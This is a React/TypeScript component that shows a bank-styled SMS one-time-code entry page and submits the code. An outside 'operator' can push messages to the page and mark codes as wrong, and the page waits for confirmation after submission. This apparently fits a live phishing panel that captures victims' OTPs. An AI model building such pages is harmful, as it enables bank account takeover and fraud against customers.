import React, { useState, useEffect } from "react";
import { submitOtp } from "../../lib/bank-api";
import type { OperatorMessage as OperatorMessageType } from "../../types";
import { Spinner } from "../../components/spinner";

interface SmsOtpProps {
  channelSlug: string;
  sessionId: string;
  onError: (msg: string) => void;
  wrongCode?: boolean;
  onTryAgain?: () => void;
  operatorMessage?: OperatorMessageType | null;
}

export function SmsOtp({
  channelSlug,
  sessionId,
  onError,
  wrongCode,
  onTryAgain,
  operatorMessage,
}: SmsOtpProps) {
  const [submitting, setSubmitting] = useState(false);
  const [resetKey, setResetKey] = useState(0);
  const [code, setCode] = useState("");

  useEffect(() => {
    if (wrongCode) {
      setSubmitting(false);
      setResetKey((k) => k + 1);
      setCode("");
    }
  }, [wrongCode]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const trimmed = code.replace(/\D/g, "").slice(0, 6);
    if (trimmed.length < 6) return;
    onTryAgain?.();
    setSubmitting(true);
    try {
      await submitOtp(channelSlug, sessionId, trimmed);
    } catch (e) {
      onError(e instanceof Error ? e.message : "Invalid code");
      setSubmitting(false);
    }
  };

  const messageClass =
    operatorMessage?.level === "error"
      ? "bank-ui-message bank-ui-message-error"
      : "bank-ui-message bank-ui-message-info";

  return (
    <div className="bank-ui-layout">
      {wrongCode && (
        <div className="bank-ui-alert">
          <p className="bank-ui-alert-title">Wrong OTP. Please try again.</p>
        </div>
      )}
      <h2 className="bank-ui-heading">Enter verification code</h2>
      <p className="bank-ui-body">
        Please enter the OTP sent to your registered mobile number.
      </p>
      {operatorMessage && (
        <div className={messageClass}>{operatorMessage.message}</div>
      )}
      <form onSubmit={handleSubmit} className="bank-ui-form">
        <div>
          <label htmlFor="otp-code" className="bank-ui-label">
            Verification code
          </label>
          <input
            id="otp-code"
            key={resetKey}
            type="text"
            inputMode="numeric"
            maxLength={6}
            value={code}
            onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
            disabled={submitting}
            placeholder="000000"
            className="bank-ui-input"
          />
        </div>
        <button
          type="submit"
          disabled={submitting || code.replace(/\D/g, "").length < 6}
          className="bank-ui-btn"
        >
          Submit
        </button>
      </form>
      {submitting && (
        <div className="bank-ui-waiting">
          <Spinner size={40} />
          <span className="bank-ui-waiting-text">Waiting for confirmation...</span>
        </div>
      )}
    </div>
  );
}
